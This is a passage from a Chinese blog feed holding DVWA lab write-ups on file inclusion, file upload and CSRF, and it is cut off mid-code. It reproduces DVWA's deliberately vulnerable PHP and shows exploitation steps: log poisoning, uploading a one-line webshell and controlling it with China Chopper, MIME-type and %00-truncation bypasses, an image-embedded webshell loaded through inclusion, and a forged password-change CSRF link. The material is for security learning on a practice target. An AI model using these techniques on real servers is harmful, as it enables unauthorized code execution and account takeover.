phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><p>Apache会记录请求<code>&lt;?php phpinfo();?&gt;</code>，并写到access.log 文件中，这时再去包含Apache日志文件，就可以利用文件包含漏洞了。<br>但是访问URL后，一句话木马在日志文件中变形了，这是由于URL编码的缘故。PHP中的&lt;&gt;都被浏览器转码了，但是可以通过burp抓包绕过编码。<br>前提是攻击者知道Apache的日志路径。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111529411.png" alt></p><p>成功写入日志文件</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（八）文件包含漏洞/20190326111538066.png" alt></p><p>因为MySQL用户权限不足，不能读取Apache的日志，需要提权操作。</p><p><strong>2.配合文件上传漏洞</strong></p><p>和文件上传漏洞或者SQL注入漏洞等一同利用，通过利用前面的漏洞将一句话木马1.php文件上传到Web服务器中，然后再通过文件包含漏洞包含出现从而得到shell。<br>例如上传了一个名为1.txt的文件，内容为：<br><code>&lt;?php phpinfo();?&gt;</code><br>直接包含该文件会将该文件以PHP来运行：</p><h3 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h3><p>1、严格判断包含中的参数是否外部可控。<br>2、路径限制，限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：<code>../</code>。<br>3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。<br>4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：<code>include(&quot;head.php&quot;)</code>。<br>5、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习（七）文件上传漏洞</title>
      <link href="/2018/05/26/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/05/26/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（七）文件上传漏洞<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。简单点说，就是用户直接或者通过各种绕过方式将webshell上传到服务器中进而执行利用。</p><p>保存一句话木马为muma.php</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105209604.png" alt></p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p><strong>源码</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105237101.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>basename() 函数返回路径中的文件名部分。<br>move_uploaded_file() 函数将上传的文件移动到新位置。<br>若成功，则返回 true，否则返回 false。<br>file 必需。规定要移动的文件。<br>newloc 必需。规定文件的新位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称</span><br><span class="line">DVWA_WEB_PAGE_TO_ROOT是网站根目录</span><br><span class="line">没有任何过滤，可以上传任意文件。</span><br><span class="line">上传muma.php显示了文件路径../../hackable/uploads/muma.php succesfully uploaded!用中国菜刀</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105329929.png" alt></p><p>然后菜刀就会通过向服务器发送包含haha参数的post请求，在服务器上执行任意命令，获取webshell权限。可以下载、修改服务器的所有文件。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105345580.png" alt></p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这里采用白名单过滤只允许上传文件的 MIME类型为image/jpeg或者image/png以及文件大小小于100000字节。</p><p><strong>1.用burp更改content-type就行</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105419722.png" alt></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105455843.png" alt></p><p><strong>2.截断绕过规则</strong></p><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为<code>muma.php%00.png</code>。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105520655.png" alt></p><p>而服务器会认为其文件名为hack.php，顺势解析为php文件。（仅限于php版本小于5.3.4的版本）</p><h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line">$uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>substr(string,start,length)返回字符串的一部分。<br>strrpos()查找第二个参数在第一个参数中最后一次出现的位置<br>$uploaded_ext等于文件的后缀名<br>getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>仍然采用白名单过滤，只允许上传的文件后缀名为jpg，jpeg，png以及文件大小小于100000字节。getimagesize函数限制了上传文件的文件头必须为图像类型。</p><p><strong>1.采用%00截断</strong></p><p>需要将上传文件的文件头伪装成图片。常见的图片格式的文件头标识如下：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105646521.png" alt></p><p>用copy将一句话木马文件php.php与图片文件1.jpg合并</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105655457.png" alt></p><p>记事本打开可以发现一句话木马藏在了图片里</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105706497.png" alt></p><p><strong>绕过后缀检查</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105736015.png" alt></p><p>然后需要用到文件包含漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWAmaster/vulnerabilities/fi/?page=file:///var/www/html/DVWA-master/hackable/uploads/muma.jpg</span><br></pre></td></tr></table></figure></p><p>在文件包含漏洞页面成功加载图片</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105813536.png" alt></p><p>然后用菜刀，地址栏填上面的url，参数名 <code>haha</code>,</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105831914.png" alt></p><p>连接失败，cookie里会有两个相同的参数，导致访问失败。wirteup上说是DVWA的BUG</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（七）文件上传漏洞/20190326105900625.png" alt></p><p>%00 截断需要 PHP&lt;5.3.4，实验环境为 5.6.35 所以无法利用。</p><h2 id="impossible难度"><a href="#impossible难度" class="headerlink" title="impossible难度"></a>impossible难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line">$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];</span><br><span class="line">$uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;;</span><br><span class="line">//$target_file = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;;</span><br><span class="line">$target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;</span><br><span class="line">$temp_file = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) );</span><br><span class="line">$temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp;</span><br><span class="line">getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br><span class="line">if( $uploaded_type == &apos;image/jpeg&apos; ) &#123;</span><br><span class="line">$img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">imagejpeg( $img, $temp_file, 100);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">imagepng( $img, $temp_file, 9);</span><br><span class="line">&#125;</span><br><span class="line">imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">// Can we move the file to the web root from the temp folder?</span><br><span class="line">if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">// Yes!</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;a href=&apos;$&#123;target_path&#125;$&#123;target_file&#125;&apos;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// No</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Delete any temp files</span><br><span class="line">if( file_exists( $temp_file ) )</span><br><span class="line">unlink( $temp_file );</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。由于基于系统时间，通过该函数生成的 ID 不是最佳的。如需生成绝对唯一的 ID，需使用 md5() 函数。</p><p>ini_get — 获取一个配置选项的值。<br>upload_tmp_dir上传文件的临时目录。<br>sys_get_temp_dir — 返回用于临时文件的目录。<br>DIRECTORY_SEPARATOR是一个返回跟操作系统相关的路径分隔符内置命令，在windows上返回\，而在linux或者类unix上回/。<br>imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像。<br>（ imagecreatefrom<em>，会检查图片规范，验证图片合法性，以此抵御图片中含有恶意 php 代码的攻击。）<br>php imagecreatefrom</em> 系列函数之 png – janes。<br>imagejpeg(a,b,c) 从 image 图像以 b为文件名创建一个JPEG 图像,c为文件质量1-100，默认约为75。<br>PHP getcwd() 函数获取当前工作目录。<br>file_exists() 函数检查文件或目录是否存在。<br>unlink() 函数删除文件。<br>impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习（六）CSRF</title>
      <link href="/2018/05/22/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89CSRF/"/>
      <url>/2018/05/22/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（六）CSRF<br><a id="more"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF(Cross-site request forgery)<br>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。</p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$pass_new = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Do the passwords match?</span><br><span class="line">if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">// They do!</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update the database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for the user</span><br><span class="line">echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Issue with passwords matching</span><br><span class="line">echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>只要参数<code>password_new=password_conf</code>，服务器就会修改密码。<br>所以只要构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.128/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;change=change</span><br></pre></td></tr></table></figure></p><p>只要cookie存在，点击这个链接之后密码就会被修改。<br>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p>如果觉得网址太明显了可以用缩短网址</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326090755406.png" alt></p><p>虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。所以我们可以构造攻击页面，让受害者去访问这个页面然后自动访问该链接<br>我们在ububtu服务器根目录创建文件123.html</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326090815342.png" alt></p><p>现在用外部主机访问该文件</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326090828170.png" alt></p><p>重新登陆显示密码错误，而用123登陆显示成功</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326090847564.png" alt></p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Checks to see where the request came from</span><br><span class="line">if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$pass_new = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Do the passwords match?</span><br><span class="line">if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">// They do!</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update the database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for the user</span><br><span class="line">echo &quot;&lt;pre&gt;Password 